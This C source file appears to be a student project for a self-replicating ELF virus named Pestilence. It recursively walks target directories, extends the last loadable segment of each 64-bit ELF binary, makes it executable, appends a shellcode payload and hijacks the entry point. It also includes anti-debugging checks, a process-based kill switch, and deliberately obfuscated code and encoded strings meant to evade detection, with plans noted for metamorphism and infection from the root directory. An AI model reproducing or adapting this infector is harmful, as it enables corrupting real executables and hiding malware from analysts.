/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
/*                                                                            */
/* ************************************************************************** */

/*
	PESTILENCE
	[ ] Creer segment pour injecter d'une taille arbitraire
	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
		- /tmp/test et /tmp/test2
		- infection binaire 64 bits
		- pas de double infection
		- pas de sortie std ou erreur
	[X] Avoid infection if debugger
	[X] Avoid infection if specific program running
	[ ] Code source illisible et offuscé

	WAR
	[ ] Fingerprint unique dans signature pour chaque infection
		- how ? why no random ?

	DEATH
	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
   original identique
		- how ?

	BONUS
	[ ] Binaire 32 bits
	[ ] Autres types de fichier non binaires
	[ ] Packing pour rendre binaire plus léger
	[ ] Infection récursive depuis / (utiliser les binaires infectés)
*/

#include "pestilence.h"

int _a(const char *o);

void _start(void)
{
	void *begin_ptr;

	__asm__ volatile(
		"lea (%%rip), %0" // Load effective address of the instruction pointer
		: "=r"(begin_ptr) // Output operand, store into `begin_ptr`
	);
	begin_ptr -= 7;
	// ft_close(1);
	// ft_close(2);

	if (/*is_debugged() || */ is_program_running("doom-nukem"))
	{
		ft_write(1, "Debugged or protected program running, exiting.\n", 48);
		ft_exit(0);
	}
	ft_write(1, "Spreading the plague...\n", 25);

	// #ifdef BONUS
	// 	// if envp has path
	// 	// 		infect path
	// 	// else
	// 	char path[2];
	// 	path[0] = '/';
	// 	path[1] = '\0';
	// 	processDirectory(path, begin_ptr);
	// #else
	char path[11];
	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'e';
	path[7] = 's';
	path[8] = 't';
	path[9] = '\0';
	path[10] = '\0';
	processDirectory(path, begin_ptr);
	path[9] = '2';
	processDirectory(path, begin_ptr);
	// #endif
	ft_exit(0);
}

// int is_program_running(const char *target)
// {
// 	int fd = ft_open("/proc", O_RDONLY | O_DIRECTORY);
// 	if (fd < 0)
// 		return 0;
// 	char buf[4096];
// 	for (;;)
// 	{
// 		int nread = ft_getdents64(fd, buf, 4096);
// 		if (nread <= 0)
// 			break;
// 		for (int bpos = 0; bpos < nread;)
// 		{
// 			struct linux_dirent64 *d = (struct linux_dirent64 *) (buf + bpos);
// 			const char			  *name = d->d_name;
// 			// skip non-numeric entries
// 			int					   numeric = 1;
// 			for (int i = 0; name[i]; i++)
// 			{
// 				if (name[i] < '0' || name[i] > '9')
// 				{
// 					numeric = 0;
// 					break;
// 				}
// 			}
// 			if (numeric)
// 			{
// 				// manually build "/proc/<pid>/comm" without printf
// 				char path[64];
// 				int	 i = 0;
// 				path[i++] = '/';
// 				path[i++] = 'p';
// 				path[i++] = 'r';
// 				path[i++] = 'o';
// 				path[i++] = 'c';
// 				path[i++] = '/';
// 				for (int j = 0; name[j]; j++)
// 					path[i++] = name[j];
// 				path[i++] = '/';
// 				path[i++] = 'c';
// 				path[i++] = 'o';
// 				path[i++] = 'm';
// 				path[i++] = 'm';
// 				path[i] = '\0';
// 				int cfd = ft_open(path, O_RDONLY);
// 				if (cfd >= 0)
// 				{
// 					char pname[64];
// 					int	 len = ft_read(cfd, pname, sizeof(pname) - 1);
// 					ft_close(cfd);
// 					if (len > 0)
// 					{
// 						pname[len] = '\0';
// 						char *nl = ft_strchr(pname, '\n');
// 						if (nl)
// 							*nl = '\0';
// 						if (ft_strcmp(pname, target) == 0)
// 						{
// 							ft_close(fd);
// 							return 1;
// 						}
// 					}
// 				}
// 			}
// 			bpos += d->d_reclen;
// 		}
// 	}
// 	ft_close(fd);
// 	return 0;
// }

// Obfuscated duplicate of is_program_running to evade detection
// clang-format off
int _a(const char*o){int a=0;if((a=ft_open("/proc",00|0200000))<0)return 0;char b[4096];for(;;){int c=ft_getdents64(a,b,4096);if(c<=0)break;for(int e=0;e<c;){struct linux_dirent64*d=(struct linux_dirent64*)(b+e);const char*f=d->d_name;int g=1;for(int i=0;f[i];i++){if(f[i]<48||f[i]>57){g=0;break;}}if(g){char h['A'];int i=0;h[i++]=47;h[i++]=112;h[i++]=114;h[i++]=111;h[i++]=99;h[i++]=47;for(int j=0;f[j];j++)h[i++]=f[j];h[i++]=47;h[i++]=99;h[i++]=111;h[i++]=109;h[i++]=109;h[i]=0;int k=ft_open(h,00);if (k >= 0){char l[64];int m=ft_read(k,l,sizeof(l)-1);ft_close(k);if(m>0){l[m]=0;char*n=ft_strchr(l,10);if(n)*n=0;if(ft_strcmp(l,o)==0){ft_close(a);return 1;}}}}e+=d->d_reclen;}}ft_close(a);return 0;}

static unsigned char ror4(unsigned char x)
{
	return (unsigned char)((x >> 4) | (x << 4));
}

static void decode(char *out, const unsigned char *in)
{
	unsigned i = 0;
	while (in[i])
	{
		out[i] = (char)((ror4(in[i]) ^ (i * 7)) - 0x3D);
		i++;
	}
	out[i] = 0;
}

static const unsigned char S_PROC[] = {
	0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0
};

static const unsigned char S_COMM[] = {
	0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0
};

int is_program_running(const char *target)
{
	int fd = -1;
	int ret = 0;

	char proc_path[16];
	decode(proc_path, S_PROC);

	fd = ft_open(proc_path, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		return 0;

	char buf[4096];

	for (;;)
	{
		int nread = ft_getdents64(fd, buf, sizeof(buf));
		if (nread <= 0)
			break;

		for (int bpos = 0; bpos < nread;)
		{
			struct linux_dirent64 *d = (void *)(buf + bpos);
			char *name = d->d_name;

			int numeric = 1;
			for (int i = 0; name[i]; i++)
				numeric &= ((unsigned)(name[i] - '0') < 10);

			if (numeric)
			{
				char path[64];
				int i = 0;

				decode(path, S_PROC);
				while (path[i]) i++;

				path[i++] = '/';
				for (int j = 0; name[j]; j++)
					path[i++] = name[j];

				char comm[8];
				decode(comm, S_COMM);

				for (int j = 0; comm[j]; j++)
					path[i++] = comm[j];

				path[i] = 0;

				int cfd = ft_open(path, O_RDONLY);
				if (cfd >= 0)
				{
					char pname[64];
					int len = ft_read(cfd, pname, sizeof(pname) - 1);
					ft_close(cfd);

					if (len > 0)
					{
						pname[len] = 0;
						for (int j = 0; j < len; j++)
							if (pname[j] == '\n') { pname[j] = 0; break; }

						if (!ft_strcmp(pname, target))
						{
							ret = 1;
							goto DONE;
						}
					}
				}
			}
			bpos += d->d_reclen;
		}
	}

DONE:
	ft_close(fd);
	return ret;
}

// clang-format on

int is_debugged(void)
{
	int f = ft_open("/proc/self/status", O_RDONLY);
	if (f < 0)
		// goto next_check;
		return 0;
	char line[256];
	int	 nread;
	int	 offset = 0;

	while ((nread = ft_read(f, line + offset, sizeof(line) - offset)) > 0)
	{
		offset += nread;
		char *newline = ft_strchr(line, '\n');
		if (newline)
		{
			*newline = '\0';
			if (ft_strncmp(line, "TracerPid:", 10) == 0)
			{
				int pid = ft_atoi(line + 10);
				ft_close(f);
				return pid != 0;
			}
			offset = 0;
		}
	}

	ft_close(f);
	// next_check:
	// 	if (ft_ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
	// 		return 1;

	// 	ft_write(1, "ptrace check passed\n", 20);
	// 	ft_ptrace(PTRACE_DETACH, 0, NULL, NULL);
	return 0;
}

void processDirectory(char *folder, void *begin_ptr)
{
	int					   fd = ft_open(folder, 0 | 65536);

	char				   buffer[1024];
	struct linux_dirent64 *dirent;
	int					   nread;

	// Loop over dir entry
	if (fd < 0)
		goto clean;
	while ((nread = ft_getdents64(fd, buffer, 1024)) > 0)
	{
		for (int bpos = 0; bpos < nread;)
		{
			char dot[3];
			// get current dir entry
			dirent = (struct linux_dirent64 *) (buffer + bpos);
			char *d_name = dirent->d_name;

			// Skip "." and ".." entries
			dot[0] = '.';
			dot[1] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			dot[1] = '.';
			dot[2] = 0;
			if (ft_strcmp(d_name, dot) == 0)
			{
				bpos += dirent->d_reclen;
				continue;
			}
			char fullPath[PATH_MAX];
			char slash[2];
			slash[0] = '/';
			slash[1] = 0;
			ft_strcat(ft_strcat(ft_strcpy(fullPath, folder), slash), d_name);

			struct stat statbuf;
			ft_lstat(fullPath, &statbuf);

			if (statbuf.st_mode & __S_IFDIR)
			{
				// If directory, recurse into it
				processDirectory(fullPath, begin_ptr);
			}
			else if (statbuf.st_mode & __S_IFREG)
			{
				// If regular file and executable, infect it
				infect(fullPath, begin_ptr);
			}

			bpos += dirent->d_reclen;
		}
	}
clean:
	ft_close(fd);
}

#define ELF_MAGIC			   0x464c457f
#define MINIMAL_INJECTION_SIZE (0x1000 * 5)
#define inout
#define CURARE                                                                 \
	"\x57\x56\x52\x53\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x8d\x35\x2e" \
	"\x00\x00\x00\xba\x0a\x00\x00\x00\x0f\x05\x48\x8d\x05\xdd\xff\xff\xff\x48" \
	"\xbb\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x48\x29\xd8\x48\xbb\xbb\xbb\xbb\xbb" \
	"\xbb\xbb\xbb\xbb\x48\x01\xd8\x5b\x5a\x5e\x5f\xff\xe0\x68\x65\x68\x65\x68" \
	"\x65\x68\x65\x0a\x00"
#define FLOWER	(sizeof(CURARE) - 1)
#define ACONIT	38
#define BUTOLIC 50

int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
			   inout char **file_data)
{
	int fd;

	write(1, path, 12);
	write(1, "\n", 1);
	*file_data = NULL;
	fd = ft_open(path, O_RDWR);
	if (fd < 0 || ft_fstat(fd, statbuf) < 0)
		goto error;
	if (ft_ftruncate(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
		goto error;
	*file_data
		= (void *) ft_syscall(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
							  PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (*file_data == MAP_FAILED)
		goto error;
	if (statbuf->st_size < sizeof(ElfW(Ehdr))
		|| ((unsigned *) *file_data)[0] != ELF_MAGIC)
		goto error;
	elf->header = (ElfW(Ehdr) *) *file_data;
	if (statbuf->st_size < elf->header->e_shoff
							   + elf->header->e_shnum * elf->header->e_shentsize
		|| statbuf->st_size
			   < elf->header->e_phoff
					 + elf->header->e_phnum * elf->header->e_phentsize)
		goto error;
	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
	return (OK);
error:
	ft_close(fd);
	ft_munmap(file_data, statbuf->st_size + MINIMAL_INJECTION_SIZE);
	return (KO);
}

void infect(char *path, void *begin_ptr)
{
	struct stat statbuf;
	char	   *file_data;
	t_elf		elf;
	ElfW(Phdr) the_rats;
	ElfW(Off) pt_load_end;
	int last_pt_load;

	if (parse_file(path, &statbuf, &elf, &file_data))
		goto clean;
	/*
	 * We need to inject 2 things
	 * 1/ PT_LOAD header
	 * -> enlarge segment that cover the injection position (and move it to
	 * unused space if conflict), also move the PT_PHDR if moving
	 * 		-> check for PT_DYN and move the address that were in the moved one
	 * -> move subsequent segments in file (minding the alignment)
	 *
	 * 2/ PT_LOAD data, je fais kinda ce que je veux je crois :D
	 */
	pt_load_end = 0;
	// if (elf.header->e_shoff
	// 	> elf.header->e_phoff + elf.header->e_phnum * elf.header->e_phentsize)
	// 	elf.header->e_shoff += 0x1000;
	// the_rats.p_type = PT_LOAD;
	// the_rats.p_offset
	// 	= elf.header->e_shoff + elf.header->e_shentsize * elf.header->e_shnum;
	// the_rats.p_filesz = 0x3000;
	// the_rats.p_memsz = 0x3000;
	// the_rats.p_align = 0x1000;
	// the_rats.p_vaddr = 0x405000 + (the_rats.p_offset % the_rats.p_align);
	// the_rats.p_paddr = the_rats.p_vaddr;
	// the_rats.p_flags = PF_X | PF_R;
	for (int i = 0; i < elf.header->e_phnum; i++)
	{
		// if (elf.segments[i].p_type == PT_DYNAMIC)
		// 	for (int j = 0; j < elf.segments[i].p_filesz;
		// 		 j += sizeof(ElfW(Dyn)))
		// 	{
		// 		ElfW(Dyn) *dynamic
		// 			= (ElfW(Dyn) *) (file_data + elf.segments[i].p_offset + j);
		// 		switch (dynamic->d_tag)
		// 		{
		// 		case DT_INIT:
		// 		case DT_FINI:
		// 		case DT_INIT_ARRAY:
		// 		case DT_FINI_ARRAY:
		// 		case DT_HASH:
		// 		case DT_GNU_HASH:
		// 		case DT_STRTAB:
		// 		case DT_SYMTAB:
		// 		case DT_PLTGOT:
		// 		case DT_JMPREL:
		// 		case DT_RELA:
		// 		case DT_VERNEED:
		// 		case DT_VERSYM:
		// 			ft_puthex(elf.header->e_phoff
		// 					  + elf.header->e_phnum * elf.header->e_phentsize
		// 					  + elf.segments[i].p_vaddr
		// 					  - elf.segments[i].p_offset);
		// 			ft_putchar('-');
		// 			ft_puthex(pt_load_end + elf.segments[i].p_vaddr
		// 					  - elf.segments[i].p_offset);
		// 			ft_putchar('(');
		// 			ft_puthex(dynamic->d_un.d_ptr);
		// 			ft_putchar(')');
		// 			ft_putchar('-');
		// 			ft_putchar('-');
		// 			ft_putchar('-');
		// 			ft_puthex(dynamic->d_tag);
		// 			ft_putchar(10);
		// 			if (dynamic->d_un.d_ptr
		// 					>= elf.header->e_phoff
		// 						   + elf.header->e_phnum
		// 								 * elf.header->e_phentsize
		// 						   + elf.segments[i].p_vaddr
		// 						   - elf.segments[i].p_offset - 0x1000
		// 				&& dynamic->d_un.d_ptr
		// 					   < pt_load_end + elf.segments[i].p_vaddr
		// 							 - elf.segments[i].p_offset - 0x1000)
		// 				dynamic->d_un.d_ptr += sizeof(ElfW(Phdr));
		// 		default:
		// 			break;
		// 		}
		// 	}
		// if (elf.segments[i].p_offset
		// 	>= elf.header->e_phoff
		// 		   + elf.header->e_phnum * elf.header->e_phentsize)
		// 	elf.segments[i].p_offset += 0x1000;
		// else if (elf.segments[i].p_offset + elf.segments[i].p_filesz
		// 		 >= elf.header->e_phoff
		// 				+ elf.header->e_phnum * elf.header->e_phentsize)
		// {
		// 	if (elf.segments[i].p_type == PT_LOAD)
		// 		pt_load_end
		// 			= elf.segments[i].p_offset + elf.segments[i].p_filesz;
		// 	elf.segments[i].p_filesz += sizeof(ElfW(Phdr));
		// 	elf.segments[i].p_memsz += sizeof(ElfW(Phdr));
		// }
		if (elf.segments[i].p_type == PT_LOAD
			&& pt_load_end < elf.segments[i].p_vaddr + elf.segments[i].p_memsz)
		{
			pt_load_end = elf.segments[i].p_vaddr + elf.segments[i].p_memsz;
			last_pt_load = i;
		}
	}
	elf.segments[last_pt_load].p_filesz = MINIMAL_INJECTION_SIZE
										  + statbuf.st_size
										  - elf.segments[last_pt_load].p_offset;
	elf.segments[last_pt_load].p_memsz = elf.segments[last_pt_load].p_filesz;
	elf.segments[last_pt_load].p_flags |= PF_X;
	// for (int i = 0; i < elf.header->e_shnum; i++)
	// {
	// 	if (elf.sections[i].sh_offset
	// 		>= elf.header->e_phoff
	// 			   + elf.header->e_phnum * elf.header->e_phentsize)
	// 		elf.sections[i].sh_offset += 0x1000;
	// 	else if (elf.sections[i].sh_offset + elf.sections[i].sh_size
	// 			 >= elf.header->e_phoff
	// 					+ elf.header->e_phnum * elf.header->e_phentsize)
	// 		elf.sections[i].sh_size += sizeof(ElfW(Phdr));
	// }
	// ft_memmove(file_data + elf.header->e_phoff
	// 			   + elf.header->e_phnum * elf.header->e_phentsize
	// 			   + sizeof(ElfW(Phdr)),
	// 		   file_data + elf.header->e_phoff
	// 			   + elf.header->e_phnum * elf.header->e_phentsize,
	// 		   pt_load_end
	// 			   - (elf.header->e_phoff
	// 				  + elf.header->e_phnum * elf.header->e_phentsize));
	// ft_memmove(file_data + pt_load_end + 0x1000, file_data + pt_load_end,
	// 		   statbuf.st_size - pt_load_end);
	// ft_memmove(file_data + elf.header->e_phoff
	// 			   + elf.header->e_phnum * elf.header->e_phentsize + 0x1000,
	// 		   file_data + elf.header->e_phoff
	// 			   + elf.header->e_phnum * elf.header->e_phentsize,
	// 		   statbuf.st_size
	// 			   - (elf.header->e_phoff
	// 				  + elf.header->e_phnum * elf.header->e_phentsize));

	// memcpy(file_data + elf.header->e_phoff
	// 		   + elf.header->e_phnum * elf.header->e_phentsize,
	// 	   &the_rats, sizeof(ElfW(Phdr)));
	// elf.header->e_phnum++;
	// ft_bzero(file_data + the_rats.p_offset, 0x3000);
	ft_puthex(elf.segments[last_pt_load].p_vaddr
			  + elf.segments[last_pt_load].p_memsz - MINIMAL_INJECTION_SIZE);
	write(1, "\n", 1);
	memcpy(file_data + statbuf.st_size, CURARE, FLOWER);
	memcpy(file_data + statbuf.st_size + BUTOLIC, &elf.header->e_entry, 8);
	elf.header->e_entry = elf.segments[last_pt_load].p_vaddr
						  + elf.segments[last_pt_load].p_memsz
						  - MINIMAL_INJECTION_SIZE;
	memcpy(file_data + statbuf.st_size + ACONIT, &elf.header->e_entry, 8);
	write(1, "OKKK\n", 5);
clean:
	ft_msync(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE, MS_SYNC);
	ft_munmap(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
}
